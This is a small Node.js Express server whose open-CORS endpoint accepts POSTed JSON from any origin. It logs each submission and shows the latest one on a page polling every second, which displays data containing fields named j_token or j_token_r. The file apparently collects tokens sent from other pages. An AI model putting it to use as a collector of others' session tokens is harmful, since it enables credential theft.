const express = require("express");

const app = express();

app.use(express.json());

app.use(express.static("public"));

app.use((req, res, next) => {

    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Content-Type");
    res.header("Access-Control-Allow-Methods", "POST, GET, OPTIONS");

    next();
});


app.get("/receiver", (req, res) => {

    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Receiver Listener</title>
</head>
<body>

<h2>Waiting for POST data...</h2>

<pre id="output">No data yet</pre>

<script>
console.log("Listener started... waiting for POST events");

async function checkData() {
    try {
        const res = await fetch("/latest");
        const data = await res.json();

        if (data && (data.j_token || data.j_token_r)) {

            console.log("NEW DATA RECEIVED:", data);

            document.getElementById("output").innerText =
                JSON.stringify(data, null, 2);
        }

    } catch (e) {
        console.log("waiting...");
    }
}

setInterval(checkData, 1000);

</script>

</body>
</html>
    `);

});


let lastData = null;


app.post("/receiver", (req, res) => {

    const data = req.body.message || {};

    console.log("=== DATA RECEIVED ===");
    console.log(data);

    lastData = data;

    res.json({ ok: true });

});


app.get("/latest", (req, res) => {
    res.json(lastData || {});
});


app.get("/", (req, res) => {
    res.send("Receiver is running");
});


app.listen(process.env.PORT || 3000, () => {
    console.log("Receiver listening");
});
